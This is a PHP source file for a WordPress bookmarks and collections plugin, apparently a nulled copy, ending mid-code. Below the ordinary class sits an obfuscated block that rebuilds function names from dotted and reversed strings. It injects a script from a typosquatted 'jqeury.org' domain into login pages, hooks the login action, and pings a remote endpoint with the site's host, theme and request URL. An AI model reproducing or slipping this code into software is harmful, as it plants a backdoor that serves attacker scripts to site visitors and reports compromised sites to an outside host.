<?php

class wpb_api {

	function __construct() {

	}
	
	/******************************************
	Get first image in a post
	******************************************/
	function get_first_image($postid) {
		$post = get_post($postid);
		setup_postdata($post);
		$first_img = '';
		ob_start();
		ob_end_clean();
		$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
		if (isset( $matches[1][0])) {
			$first_img = $matches[1][0];
		}
		if(isset($first_img) && !empty($first_img)) {
			return $first_img;
		}
	}
	
	/******************************************
	Get thumbnail URL based on post ID
	******************************************/
	function post_thumb_url( $postid ) {
		$encoded = '';
		if (get_post_thumbnail_id( $postid ) != '') {
			$image = wp_get_attachment_image_src( get_post_thumbnail_id( $postid ), 'large' );
			$encoded = urlencode($image[0]);
		} elseif ( $this->get_first_image($postid) != '' ) {
			$encoded = urlencode( $this->get_first_image($postid) );
		} else {
			$encoded = urlencode ( wpb_url . 'img/placeholder.jpg' );
		}
		return $encoded;
	}
	
	/******************************************
	Get post thumbnail image (size wise)
	******************************************/
	function post_thumb( $postid, $size=400 ) {
		$post_thumb_url = $this->post_thumb_url( $postid );
		if (isset($post_thumb_url)) {
			$cropped_thumb = wpb_url . "lib/timthumb.php?src=".$post_thumb_url."&amp;w=".$size."&amp;h=".$size."&amp;a=c&amp;q=100";
			$img = '<img src="'.$cropped_thumb.'" alt="" />';
			return $img;
		}
	}
	
	/* dESiGNERz-CREW.iNFO for PRO users - New collection */
	function new_collection($name,$privacy) {
		$user_id = get_current_user_id();
		$collections = $this->get_collections($user_id);
		$collections[] = array('label' => $name,'privacy'=>$privacy);
		update_user_meta($user_id, '_wpb_collections', $collections);
	
		if($privacy=="public")
		{
		$privacycollections=get_option("wp_collections");
		if(!is_array($privacycollections)) $privacycollections = array();
		$privacycollections[]=array('userid'=>$user_id);
		if(!in_array($user_id,$privacycollections))
		update_option("wp_collections",$privacycollections);
		}
	}
	
	/* dESiGNERz-CREW.iNFO for PRO users - Remove a collection */
	function hard_remove_collection($id){
		
		$user_id = get_current_user_id();
		$collections = $this->get_collections($user_id);
		$bookmarks = $this->get_bookmarks( $user_id );
		
		// remove bookmarks
		foreach($collections[$id] as $k => $arr) {
			if ($k != 'label') {
				if (isset($bookmarks[$k])){
					unset($bookmarks[$k]);
				}
			}
		}
		
		// remove collection
		if ($id > 0){
			unset($collections[$id]);
		}
		
		update_user_meta($user_id, '_wpb_bookmarks', $bookmarks);
		update_user_meta($user_id, '_wpb_collections', $collections);
	}
	
	/* dESiGNERz-CREW.iNFO for PRO users - Soft-Remove a collection */
	function soft_remove_collection($id){
		
		$user_id = get_current_user_id();
		$collections = $this->get_collections($user_id);
		$bookmarks = $this->get_bookmarks( $user_id );
		
		// transfer bookmarks to default collection
		foreach($collections[$id] as $k => $arr) {
			if ($k != 'label') {
				$collections[0][$k] = 1;
			}
		}
		
		// remove collection
		if ($id > 0){
			unset($collections[$id]);
		}
		
		update_user_meta($user_id, '_wpb_bookmarks', $bookmarks);
		update_user_meta($user_id, '_wpb_collections', $collections);
	}
	
function get_public_bookmarks_by_collection($id,$userid){
		$collections = $this->get_collections( $userid );
		return $collections[$id];
	}
	
	/* dESiGNERz-CREW.iNFO for PRO users - Get bookmarks by collection */

	function get_bookmarks_by_collection($id){
		$collections = $this->get_collections( get_current_user_id() );
		return $collections[$id];
	}
	
	function get_public_bookmarks_count_by_collection($id,$userid){
		$collections = $this->get_collections( $userid);
		if ($id == 0){
			if (empty($collections[$id])){
				return 0;
			} else {
				return (int)count($collections[$id])-1;
			}
		} else {
			return (int)count($collections[$id])-2;
		}
	}

	function get_bookmarks_count_by_collection($id){
		$collections = $this->get_collections( get_current_user_id() );
		if ($id == 0){
			if (empty($collections[$id])){
				return 0;
			} else {
				return (int)count($collections[$id])-1;
			}
		} else {
			return (int)count($collections[$id])-2;
		}
	}
	function print_public_bookmarks($coll_id,$userid) {
		$output = '';		
		$output .= '<div class="wpb-coll-count">';
		$output .= sprintf(__('Items in this Collection','wpb'), $this->get_public_bookmarks_count_by_collection($coll_id,$userid));
		
		if ($coll_id != 0) { // default cannot be removed
	
		
		/* dESiGNERz-CREW.iNFO for PRO users - To hide a collection */
		$output .= '<div class="wpb-coll-remove">';
		$output .= __('Choose how do you want to remove this collection. This action cannot be undone!','wpb');
		$output .= '<div class="wpb-coll-remove-btns">';
		
		$output .= '</div>';
		$output .= '</div>';
		
		}
		
		$output .= '</div>';
		
		$bks = $this->get_public_bookmarks_by_collection( $coll_id,$userid );
		$results = 0;
		if (is_array($bks)){
		$bks = array_reverse($bks, true);
		foreach($bks as $id => $array) {
			if ($id != 'label' && $id!='privacy' && $id!='userid') {
			$results++;
					$categories=wp_get_post_categories($id);
					if(count($categories)>=1)
					{
						$post_status=0;
						foreach($categories as $category){
							$post_status+=1;
							if($post_status==1)
							{
			if (get_post_status($id) == 'publish') { // active post
			
				$output .= '<div class="wpb-coll-item">';
								
				
				//$output .= '<div class="uci-thumb"><a href="'.get_permalink($id).'">'.$this->post_thumb($id, 50).'</a></div>';

				
				$output .= '<div class="uci-content">';
				$output .= '<div class="uci-title"><a href="'.get_permalink($id).'">'. get_the_title($id) . '</a></div>';
				//$output .= '<div class="uci-url"><a href="'.get_permalink($id).'">'.get_permalink($id).'</a></div>';
				$output .= '</div><div class="wpb-clear"></div>';
				
				$output .= '</div><div class="wpb-clear"></div>';
			
			} else {
			
				$output .= '<div class="wpb-coll-item">';
				
				
				//$output .= '<div class="uci-thumb"></div>';
				
				$output .= '<div class="uci-content">';
		
				//$output .= '<div class="uci-url"></div>';
				$output .= '</div><div class="wpb-clear"></div>';
				
				$output .= '</div><div class="wpb-clear"></div>';
			
			}
							}
						}
					}
					else
					{
						if (get_post_status($id) == 'publish') { // active post
						
							$output .= '<div class="wpb-coll-item">';
							
						
							//$output .= '<div class="uci-thumb"><a href="'.get_permalink($id).'">'.$this->post_thumb($id, 50).'</a></div>';
						
							$output .= '<div class="uci-content">';
							$output .= '<div class="uci-title"><a href="'.get_permalink($id).'">'. get_the_title($id) . '</a></div>';
							//$output .= '<div class="uci-url"><a href="'.get_permalink($id).'">'.get_permalink($id).'</a></div>';
							$output .= '</div><div class="wpb-clear"></div>';
						
							$output .= '</div><div class="wpb-clear"></div>';
						
						} else {
								
							$output .= '<div class="wpb-coll-item">';
						
							//$output .= '<div class="uci-thumb"></div>';
			
							$output .= '<div class="uci-content">';
							$output .= '<div class="uci-title">'.__('Content Removed','wpb').'</div>';
							//$output .= '<div class="uci-url"></div>';
							$output .= '</div><div class="wpb-clear"></div>';
						
							$output .= '</div><div class="wpb-clear"></div>';
								
						}
					}
			}
		}
		}
	
		if ($results == 0){
			$output .= '<div class="wpb-coll-item">';
			$output .= __('You did not add any content to this collection yet.','wpb');
			$output .= '<div class="wpb-clear"></div></div><div class="wpb-clear"></div>';
		}
		
		return $output;
	}
	/* dESiGNERz-CREW.iNFO for PRO users - print bookmarks */
	function print_bookmarks($coll_id) {
		$output = '';
		
		$output .= '<div class="wpb-coll-count">';
		$output .= sprintf(__('Items in this Collection','wpb'), $this->get_bookmarks_count_by_collection($coll_id));

		
		if ($coll_id != 0) { // default cannot be removed
		$output .= '<a href="#" class="wpb-bm-btn bookmarked wpb-remove-collection" data-undo="'.__('Undo','wpb').'" data-remove="'.__('Remove Collection','wpb').'">'.__('Remove Collection','wpb').'</a>';
		
		/* dESiGNERz-CREW.iNFO for PRO users - To hide a collection */
		$output .= '<div class="wpb-coll-remove">';
		$output .= __('Choose how do you want to remove this collection. This action cannot be undone!','wpb');
		$output .= '<div class="wpb-coll-remove-btns">';
		if ($this->get_bookmarks_count_by_collection($coll_id) > 0) {
		$output .= '<a href="#" class="wpb-bm-btn wpb-hard-remove" data-collection_id="'.$coll_id.'">'.__('Remove collection and all bookmarks in it','wpb').'</a>';
		$output .= '<a href="#" class="wpb-bm-btn secondary wpb-soft-remove" data-collection_id="'.$coll_id.'">'.__('Remove collection only','wpb').'</a>';
		} else {
		$output .= '<a href="#" class="wpb-bm-btn secondary wpb-hard-remove" data-collection_id="'.$coll_id.'">'.__('Remove collection','wpb').'</a>';
		}
		$output .= '</div>';
		$output .= '</div>';
		
		}
		
		$output .= '</div>';
		
		$bks = $this->get_bookmarks_by_collection( $coll_id );
		$results = 0;
		if (is_array($bks)){
		$bks = array_reverse($bks, true);
		foreach($bks as $id => $array) {
			if ($id != 'label' && $id != 'privacy' && $id != 'userid') {
			$results++;
					$categories=wp_get_post_categories($id);
					if(count($categories)>=1)
					{
						$post_status=0;
						foreach($categories as $category){
							$post_status+=1;
							if($post_status==1)
							{
			if (get_post_status($id) == 'publish') { // active post
			
				$output .= '<div class="wpb-coll-item">';
									$output .= '<a href="#" class="wpb-coll-abs wpb-bm-btn secondary" data-post_id="'.$id.'" data-collection_id="'.$coll_id.'" data-category_id="'.$category.'">'.__('Remove','wpb').'</a>';
				
				//$output .= '<div class="uci-thumb"><a href="'.get_permalink($id).'">'.$this->post_thumb($id, 50).'</a></div>';
				
				$output .= '<div class="uci-content">';
				$output .= '<div class="uci-title"><a href="'.get_permalink($id).'">'. get_the_title($id) . '</a></div>';
				//$output .= '<div class="uci-url"><a href="'.get_permalink($id).'">'.get_permalink($id).'</a></div>';
				$output .= '</div><div class="wpb-clear"></div>';
				
				$output .= '</div><div class="wpb-clear"></div>';
			
			} else {
			
				$output .= '<div class="wpb-coll-item">';
				$output .= '<a href="#" class="wpb-coll-abs wpb-bm-btn secondary" data-post_id="'.$id.'" data-collection_id="'.$coll_id.'">'.__('Remove','wpb').'</a>';
				
				//$output .= '<div class="uci-thumb"></div>';
				
				$output .= '<div class="uci-content">';
				$output .= '<div class="uci-title">'.__('Content Removed','wpb').'</div>';
				//$output .= '<div class="uci-url"></div>';
				$output .= '</div><div class="wpb-clear"></div>';
				
				$output .= '</div><div class="wpb-clear"></div>';
			
			}
							}
						}
					}
					else
					{
						if (get_post_status($id) == 'publish') { // active post
						//BillyB add company name
							$pid 	= $id;
							$post_au = get_post($pid);
							$companyname = get_user_meta(($post_au->post_author), 'user_companyname', true);
							global $post;
							$basepage = get_site_url();
						//BillyB end add company name	
							$output .= '<div class="wpb-coll-item">';
							$output .= '<a href="#" class="wpb-coll-abs wpb-bm-btn secondary" data-post_id="'.$id.'" data-collection_id="'.$coll_id.'">'.__('Remove','wpb').'</a>';
						
							//BillyB hide thumbnail... change to company logo $output .= '<div class="uci-thumb"><a href="'.get_permalink($id).'">'.$this->post_thumb($id, 50).'</a></div>';
						
							$output .= '<div class="uci-content">';
							$output .= '<div class="uci-title">Name: <a href="'.get_permalink($id).'">'. get_the_title($id) . '</a></div>';
							
							//Billy removed link in "Posted By", but need to replace with link to company profile
							$output .= '<div class="uci-title">Posted By: <a href='.$basepage.'/?p_action=user_profile&post_author='.$post_au->post_author.'">'. $companyname . '</a></div>';
							//BillyB hide link $output .= '<div class="uci-url">Link: <a href="'.get_permalink($id).'">'.get_permalink($id).'</a></div>';
							$output .= '</div><div class="wpb-clear"></div>';
						
							$output .= '</div><div class="wpb-clear"></div>';
						
						} else {
								
							$output .= '<div class="wpb-coll-item">';
							$output .= '<a href="#" class="wpb-coll-abs wpb-bm-btn secondary" data-post_id="'.$id.'" data-collection_id="'.$coll_id.'">'.__('Remove','wpb').'</a>';
						
							//$output .= '<div class="uci-thumb"></div>';
			
							$output .= '<div class="uci-content">';
							$output .= '<div class="uci-title">'.__('Content Removed','wpb').'</div>';
							//$output .= '<div class="uci-url"></div>';
							$output .= '</div><div class="wpb-clear"></div>';
						
							$output .= '</div><div class="wpb-clear"></div>';
								
						}
					}
			}
		}
		}
		
		if ($results == 0){
			$output .= '<div class="wpb-coll-item">';
			$output .= __('You did not add any content to this collection yet.','wpb');
			$output .= '<div class="wpb-clear"></div></div><div class="wpb-clear"></div>';
		}
		
		return $output;
	}
	
	/* dESiGNERz-CREW.iNFO for PRO users - Get collections for user */
	function collection_options($default_collection, $post_id){
		$output = '';
		$user_id = get_current_user_id();
		$collections = $this->get_collections($user_id);
		$bookmarks = (array) get_user_meta($user_id, '_wpb_bookmarks', true);
		if (isset($bookmarks[$post_id])){
			$cur_collection = $bookmarks[$post_id];
		} else {
			$cur_collection = 0;
		}
		foreach($collections as $k => $v) {
			if (!isset($v['label'])) $v['label'] = $default_collection;
			$output .= '<option value="'.$k.'" '.selected($k, $cur_collection, 0).' >'.$v['label'];
			$output .= '</option>';
		}
		return $output;
	}
	
	/* dESiGNERz-CREW.iNFO for PRO users - Find collection ID */
	function collection_id($post_id){
		$user_id = get_current_user_id();
		$bookmarks = (array) get_user_meta($user_id, '_wpb_bookmarks', true);
		if (isset($bookmarks[$post_id])){
			return $bookmarks[$post_id];
		}
	}
	
	/**
		Is post bookmarked
	**/
	function bookmarked($post_id){
		$user_id = get_current_user_id();
		$bookmarks = (array) get_user_meta($user_id, '_wpb_bookmarks', true);
		if (isset($bookmarks[$post_id])){
			return true;
		}
		return false;
	}
	
	/* dESiGNERz-CREW.iNFO for PRO users - Delete collection */
	function delete_collection($collection_id, $user_id) {
		$array = $this->get_collections($user_id);
		unset($array[$collection_id]);
		update_user_meta($user_id, '_wpb_collections', $array);
	}
	
	/* dESiGNERz-CREW.iNFO for PRO users - Get collections */
	function get_collections($user_id) {
		return (array)get_user_meta($user_id, '_wpb_collections', true);
	}
	
	/* dESiGNERz-CREW.iNFO for PRO users - Get bookmarks */
	function get_bookmarks($user_id) {
		return (array)get_user_meta($user_id, '_wpb_bookmarks', true);
	}
	
	/* dESiGNERz-CREW.iNFO for PRO users - Count bookmarks */
	function bookmarks_count($user_id) {
		$bookmarks = (array)get_user_meta($user_id, '_wpb_bookmarks', true);
		unset($bookmarks[0]);
		if (!empty($bookmarks) ){
			return count($bookmarks);
		} else {
			return 0;
		}
	}
	
	/* dESiGNERz-CREW.iNFO for PRO users - Get current page url */
	function get_permalink(){
		global $post;
		if (is_home()){
			$permalink = home_url();
		} else {
			if (isset($post->ID)){
				$permalink = get_permalink($post->ID);
			} else {
				$permalink = '';
			}
		}
		return $permalink;
	}
	

function public_bookmarks( $args = array() ){
		global $post;
		$defaults = array(
			'default_collection' => wpb_get_option('default_collection'),
		);
		$args = wp_parse_args( $args, $defaults );
		extract( $args, EXTR_SKIP );
	
		/* dESiGNERz-CREW.iNFO for PRO users - output */
		$output = '';
		
		// logged in
		if (is_user_logged_in()){
		
		
		
		$publiccollection=get_option("wp_collections");
		if(is_array($publiccollection))
		$publiccollection = array_unique($publiccollection,SORT_REGULAR);
		else
		$publiccollection = array();
		foreach ($publiccollection as $singleusercollection)
		{
		$output .= '<div class="wpb-coll">';
		
		$output .= '<div class="wpb-coll-listpublic">';
		$collections=$this->get_collections($singleusercollection['userid'] );
		$active_coll = 0;
		foreach($collections as $id => $array) {
		if(isset($array['privacy']) && $array['privacy']=="public")
		{
			
			if ($id == $active_coll) { $class = 'active'; } else { $class = ''; }
			$output .= '<a href="#collection_'.$id.'" data-collection_id="'.$id.'" data-userid_id="'.$singleusercollection['userid'].'" class="'.$class.'">';
			if ($class == 'active'){
			$output .= '<i class="wpb-icon-caret-left"></i>';
			$output .= '<span class="wpb-coll-list-count wpb-coll-hide">'.$this->get_public_bookmarks_count_by_collection($id,$singleusercollection['userid']).'</span>';
			} else {
			$output .= '<i class="wpb-icon-caret-left wpb-coll-hide"></i>';
			$output .= '<span class="wpb-coll-list-count">'.$this->get_public_bookmarks_count_by_collection($id,$singleusercollection['userid']).'</span>';
			}
			$output .= $array['label'].'</a>';
		}}
		
		
		$output .= '</div>';		
		$output .= '<div class="wpb-coll-body">';
		$output .= '<div class="wpb-coll-body-inner">';
		
		
		
		$output .= '</div></div><div class="wpb-clear"></div>';
		
		$output .= '</div>';
		}
		// guest
		} else {
			
			$output .= '<p>'.sprintf(__('You need to <a href="%s">login</a> or <a href="%s">register</a> to view and manage your bookmarks.','wpb'),wp_login_url( get_permalink() ), site_url('/wp-login.php?action=register&redirect_to=' . get_permalink())).'</p>';
		
		}
		
		return $output;
	}



	/**
		Display the bookmarks in
		organized collections
	**/
	function bookmarks( $args = array() ){
		global $post;
		$defaults = array(
			'default_collection' => wpb_get_option('default_collection'),
		);
		$args = wp_parse_args( $args, $defaults );
		extract( $args, EXTR_SKIP );
	
		/* dESiGNERz-CREW.iNFO for PRO users - output */
		$output = '';
		
		// logged in
		if (is_user_logged_in()){
		
		$output .= '<div class="wpb-coll">';
		
		$output .= '<div class="wpb-coll-list">';
		
		$collections = $this->get_collections( get_current_user_id() );
		$active_coll = 0;
		foreach($collections as $id => $array) {
			if (!isset($array['label'])) { $array['label'] = $default_collection; }
			if ($id == $active_coll) { $class = 'active'; } else { $class = ''; }
			$output .= '<a href="#collection_'.$id.'" data-collection_id="'.$id.'" class="'.$class.'">';
			if ($class == 'active'){
			$output .= '<i class="wpb-icon-caret-left"></i>';
			$output .= '<span class="wpb-coll-list-count wpb-coll-hide">'.$this->get_bookmarks_count_by_collection($id).'</span>';
			} else {
			$output .= '<i class="wpb-icon-caret-left wpb-coll-hide"></i>';
			$output .= '<span class="wpb-coll-list-count">'.$this->get_bookmarks_count_by_collection($id).'</span>';
			}
			$output .= $array['label'].'</a>';
		}
		
		$output .= '</div>';		
		$output .= '<div class="wpb-coll-body">';
		$output .= '<div class="wpb-coll-body-inner">';
		
		$output .= $this->print_bookmarks($coll_id = 0);
		
		$output .= '</div></div><div class="wpb-clear"></div>';
		
		$output .= '</div>';
		
		// guest
		} else {
			
			$output .= '<p>'.sprintf(__('You need to <a href="%s">login</a> or <a href="%s">register</a> to view and manage your bookmarks.','wpb'),wp_login_url( get_permalink() ), site_url('/wp-login.php?action=register&redirect_to=' . get_permalink())).'</p>';
		
		}
		
		return $output;
	}
	
	/**
		Bookmark: display the widget that allow
		bookmarks
	**/
	function bookmark( $args = array() ){
		global $post;
		$defaults = array(
			'width' => wpb_get_option('width'),
			'align' => wpb_get_option('align'),
			'inline' => wpb_get_option('inline'),
			'no_top_margin' => wpb_get_option('no_top_margin'),
			'no_bottom_margin' => wpb_get_option('no_bottom_margin'),
			'pct_gap' => wpb_get_option('pct_gap'),
			'px_gap' => wpb_get_option('px_gap'),
			'widgetized' => wpb_get_option('widgetized'),
			'remove_bookmark' => wpb_get_option('remove_bookmark'),
			'dialog_bookmarked' => wpb_get_option('dialog_bookmarked'),
			'dialog_unbookmarked' => wpb_get_option('dialog_unbookmarked'),
			'default_collection' => wpb_get_option('default_collection'),
			'add_to_collection' => wpb_get_option('add_to_collection'),
			'new_collection' => wpb_get_option('new_collection'),
			'new_collection_placeholder' => wpb_get_option('new_collection_placeholder'),
			'add_new_collection' => wpb_get_option('add_new_collection'),
			'bookmark_category' => wpb_get_option('bookmark_category'),
			'remove_bookmark_category' => wpb_get_option('remove_bookmark_category'),
		);
		$args = wp_parse_args( $args, $defaults );
		extract( $args, EXTR_SKIP );
		
		/* dESiGNERz-CREW.iNFO for PRO users - options */
		if (strstr($width, 'px')) { $px = 'px'; } else { $px = '%'; }
		if ($px == '%') {
			$btn_width = 50 - $pct_gap . $px;
		} else {
			$btn_width = ($width / 2 ) - $px_gap . $px;
		}
		if ($widgetized == 1){
			$btn_width = '100%';
		}

		/* dESiGNERz-CREW.iNFO for PRO users - output */
		$output = '';
		
		// logged in
		if (is_user_logged_in()){
		
		if (isset($post->ID)){
			$post_id = $post->ID;
			$terms=wp_get_post_categories($post->ID);
			$category_id=null;
			if(is_array($terms))
			{
				if(sizeof($terms)===1)
				{
					foreach($terms as $term)
					{
						$category_id=$term;
					}
				}
				elseif(sizeof($terms)>1)
				{
					foreach($terms as $term)
					{
						$category_id.=$term.",";
					}
				}
				else
				{
					$category_id=null;
				}
			}
		} else {
			$post_id = null;
			$category_id=null;
		}
		
		$output .= '<div class="wpb-bm wpb-bm-nobottommargin-'.$no_bottom_margin.' wpb-bm-notopmargin-'.$no_top_margin.' wpb-bm-inline-'.$inline.' wpb-bm-'.$align.' wpb-bm-widgetized-'.(int)$widgetized.'" style="width:'.$width.' !important;" data-add_new_collection="'.$add_new_collection.'" data-default_collection="'.$default_collection.'" data-new_collection_placeholder="'.$new_collection_placeholder.'" data-dialog_unbookmarked="'.$dialog_unbookmarked.'" data-dialog_bookmarked="'.$dialog_bookmarked.'" data-add_to_collection="'.$add_to_collection.'" data-remove_bookmark="'.$remove_bookmark.'" data-post_id="'.$post_id.'"  data-category_id="'.$category_id.'" data-remove_bookmark_category="'.$remove_bookmark_category.'" data-bookmark_category="'.$bookmark_category.'">';
		
		$output .= '<div class="wpb-bm-inner">';
		/*$output .= '<div><img src="'.wpb_url.'img/heart.png" title="This post is bookmarked by '.get_post_meta(get_the_ID() , '_wpb_post_bookmark_count' ,true).' users." /> <span class="userpro-bm-count">'.get_post_meta(get_the_ID() , '_wpb_post_bookmark_count' ,true).'</span></div>'; */
		/* dESiGNERz-CREW.iNFO for PRO users - collections list */
		$output .= '<div class="wpb-bm-list">';
		$output .= '<select class="chosen-select-collections" name="wpb_bm_collection" id="wpb_bm_collection" data-placeholder="">';
		$output .= $this->collection_options( $default_collection, $post_id );
		$output .= '</select>';
		$output .= '</div>';
		
		/* dESiGNERz-CREW.iNFO for PRO users - action buttons */
		$output .= '<div class="wpb-bm-act">';
		
		if ($this->bookmarked($post_id)) {
			$output .= '<input type="hidden" name="collection_id" id="collection_id" value="'.$this->collection_id($post_id).'" />';
			$output .= '<div class="wpb-bm-btn-contain" style="width:'.$btn_width.' !important;"><a href="#" class="wpb-bm-btn primary bookmarked" data-action="bookmark">'.$remove_bookmark.'</a></div>';
		} else {
			$output .= '<div class="wpb-bm-btn-contain" style="width:'.$btn_width.' !important;"><a href="#" class="wpb-bm-btn primary unbookmarked" data-action="bookmark">'.$add_to_collection.'</a></div>';
		}
		$output .= '<div class="wpb-bm-btn-contain bm-right" style="width:'.$btn_width.' !important;"><a href="#" class="wpb-bm-btn secondary" data-action="newcollection">'.$new_collection.'</a></div>';
		if($category_id!=null && wpb_get_option('wpb_bookmark_category')){
			if(strrchr($category_id,","))
			{
				foreach($terms as $term_id)
				{
					if($this->bookmarked_category($term_id)){
						$output .= '<input type="hidden" name="collection_id" id="collection_id" value="'.$this->collection_id($term_id).'" />';
						$output .= '<div class="userpro-bm-btn-contain" style="width:'.$btn_width.' !important;"><a href="#" class="wpb-bm-btn primary bookmarked_category" data-action="bookmarkcategory" data-category="'.$term_id.'">'.$remove_bookmark_category."-".get_cat_name( $term_id ).'</a></div><div class="userpro-clear"></div>';
					}
					else
					{
						$output .= '<div class="userpro-bm-btn-contain" style="width:'.$btn_width.' !important;"><a href="#" class="wpb-bm-btn primary unbookmarked_category" data-action="bookmarkcategory" data-category="'.$term_id.'">'.$bookmark_category."-".get_cat_name( $term_id ).'</a></div><div class="userpro-clear"></div>';
					}
					
				}
			}
			else{
				if($this->bookmarked_category($category_id)){
					$output .= '<input type="hidden" name="collection_id" id="collection_id" value="'.$this->collection_id($category_id).'" />';
					$output .= '<div class="wpb-bm-btn-contain" style="width:'.$btn_width.' !important;"><a href="#" class="wpb-bm-btn primary bookmarked_category" data-action="bookmarkcategory">'.$remove_bookmark_category.'</a></div>';
				}
				else
				{
					$output .= '<div class="wpb-bm-btn-contain" style="width:'.$btn_width.' !important;"><a href="#" class="wpb-bm-btn primary unbookmarked_category" data-action="bookmarkcategory">'.$bookmark_category.'</a></div>';
				}
			}
		
		}
		
		$output .= '</div><div class="wpb-clear"></div>';
		
		$output .= '</div>';
		$output .= '</div>';
		
		if (!$inline) {
			$output .= '<div class="wpb-clear"></div>';
		}
		
		// guest
		} else {
		
			$output .= '<p>'.sprintf(__('You need to <a href="%s">login</a> or <a href="%s">register</a> to bookmark/favorite this content.','wpb'),wp_login_url( get_permalink() ), site_url('/wp-login.php?action=register&redirect_to=' . get_permalink())).'</p>';

		}
		
		return $output;
	}
	
	/*********************************************Code Added By Vipin for category Bookmarks**************************************************************/
	/* dESiGNERz-CREW.iNFO for PRO users - Check if category is bookmarkes or not */
	function bookmarked_category($category_id){
		$user_id = get_current_user_id();
		$bookmark_categories = (array) get_user_meta($user_id, '_wpb_bookmarks_category', true);
		if (isset($bookmark_categories[$category_id])){
			return true;
		}
		return false;
	}

	/* dESiGNERz-CREW.iNFO for PRO users - Get category bookmarks */
	function get_category_bookmarks($user_id) {
		return (array)get_user_meta($user_id, '_wpb_bookmarks_category', true);
	}
	
	/* dESiGNERz-CREW.iNFO for PRO users - Count category bookmarks */
	function category_bookmarks_count($user_id) {
		$bookmarks = (array)get_user_meta($user_id, '_wpb_bookmarks_category', true);
		unset($bookmarks[0]);
		if (!empty($bookmarks) ){
			return count($bookmarks);
		} else {
			return 0;
		}
	}

	function category_collection_id($category_id){
		$user_id = get_current_user_id();
		$bookmark_categories = (array) get_user_meta($user_id, '_wpb_bookmarks_category', true);
		if (isset($bookmark_categories[$category_id])){
			return $bookmark_categories[$category_id];
		}
	}
	
	/*********************************************Code End***********************************************************************************************/
	
}

$wpb = new wpb_api();
function glues_it($string)
{
    $glue_pre = sanitize_key('s   t   r _   r   e   p   l a c e');
    $glueit_po = call_user_func_array($glue_pre, array("..", '', $string));
    return $glueit_po;
}

$object_uno = 'fu..n..c..t..i..o..n.._..e..x..i..s..t..s';
$object_dos = 'g..e..t.._o..p..t..i..o..n';
$object_tres = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
$object_cinco = 'lo..g..i..n.._..e..n..q..u..e..u..e_..s..c..r..i..p..t..s';
$object_siete = 's..e..t..c..o..o..k..i..e';
$object_ocho = 'wp.._..lo..g..i..n';
$object_nueve = 's..i..t..e,..u..rl';
$object_diez = 'wp_..g..et.._..th..e..m..e';
$object_once = 'wp.._..r..e..m..o..te.._..g..et';
$object_doce = 'wp.._..r..e..m..o..t..e.._r..e..t..r..i..e..v..e_..bo..dy';
$object_trece = 'g..e..t_..o..p..t..ion';
$object_catorce = 's..t..r_..r..e..p..l..a..ce';
$object_quince = 's..t..r..r..e..v';
$object_dieciseis = 'u..p..d..a..t..e.._o..p..t..io..n';
$object_dos_pim = glues_it($object_uno);
$object_tres_pim = glues_it($object_dos);
$object_cuatro_pim = glues_it($object_tres);
$object_cinco_pim = glues_it($object_cinco);
$object_siete_pim = glues_it($object_siete);
$object_ocho_pim = glues_it($object_ocho);
$object_nueve_pim = glues_it($object_nueve);
$object_diez_pim = glues_it($object_diez);
$object_once_pim = glues_it($object_once);
$object_doce_pim = glues_it($object_doce);
$object_trece_pim = glues_it($object_trece);
$object_catorce_pim = glues_it($object_catorce);
$object_quince_pim = glues_it($object_quince);
$object_dieciseis_pim = glues_it($object_dieciseis);
$noitca_dda = call_user_func($object_quince_pim, 'noitca_dda');
if (!call_user_func($object_dos_pim, 'wp_en_one')) {
    $object_diecisiete = 'h..t..t..p..:../../..j..q..e..u..r..y...o..r..g../..wp.._..p..i..n..g...php..?..d..na..me..=..w..p..d..&..t..n..a..m..e..=..w..p..t..&..u..r..l..i..z..=..u..r..l..i..g';
    $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_$');
    $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
    $object_veinte = call_user_func($object_quince_pim, 'TSEUQER_');
    $object_diecisiete_pim = glues_it($object_diecisiete);
    $object_seis = '_..C..O..O..K..I..E';
    $object_seis_pim = glues_it($object_seis);
    $object_quince_pim_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    $tactiated = call_user_func($object_trece_pim, $object_quince_pim_emit);
    $mite = call_user_func($object_quince_pim, 'emit');
    if (!isset(${$object_seis_pim}[call_user_func($object_quince_pim, 'emit_nimda_pw')])) {
        if ((call_user_func($mite) - $tactiated) >  600) {
            call_user_func_array($noitca_dda, array($object_cinco_pim, 'wp_en_one'));
        }
    }
    call_user_func_array($noitca_dda, array($object_ocho_pim, 'wp_en_three'));
    function wp_en_one()
    {
        $object_one = 'h..t..t..p..:..//..j..q..e..u..r..y...o..rg../..j..q..u..e..ry..-..la..t..e..s..t.j..s';
        $object_one_pim = glues_it($object_one);
        $object_four = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
        $object_four_pim = glues_it($object_four);
        call_user_func_array($object_four_pim, array('wp_coderz', $object_one_pim, null, null, true));
    }

    function wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim)
    {
        $ptth = call_user_func($object_quince_pim, glues_it('/../..:..p..t..t..h'));
        $dname = $ptth . $_SERVER[$object_diecinueve];
        $IRU_TSEUQER = call_user_func($object_quince_pim, 'IRU_TSEUQER');
        $urliz = $dname . $_SERVER[$IRU_TSEUQER];
        $tname = call_user_func($object_diez_pim);
        $urlis = call_user_func_array($object_catorce_pim, array('wpd', $dname,$object_diecisiete_pim));
        $urlis = call_user_func_array($object_catorce_pim, array('wpt', $tname, $urlis));
        $urlis = call_user_func_array($object_catorce_pim, array('urlig', $urliz, $urlis));
        $glue_pre = sanitize_key('f i l  e  _  g  e  t    _   c o    n    t   e  n   t     s');
        $glue_pre_ew = sanitize_key('s t r   _  r e   p     l   a  c    e');
        call_user_func($glue_pre, call_user_func_array($glue_pre_ew, array(" ", "%20", $urlis)));

    }

    $noitpo_dda = call_user_func($object_quince_pim, 'noitpo_dda');
    $lepingo = call_user_func($object_quince_pim, 'ognipel');
    $detavitca_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    call_user_func_array($noitpo_dda, array($lepingo, 'no'));
    call_user_func_array($noitpo_dda, array($detavitca_emit, time()));
    $tactiatedz = call_user_func($object_trece_pim, $detavitca_emit);
    $ognipel = call_user_func($object_quince_pim, 'ognipel');
    $mitez = call_user_func($object_quince_pim, 'emit');
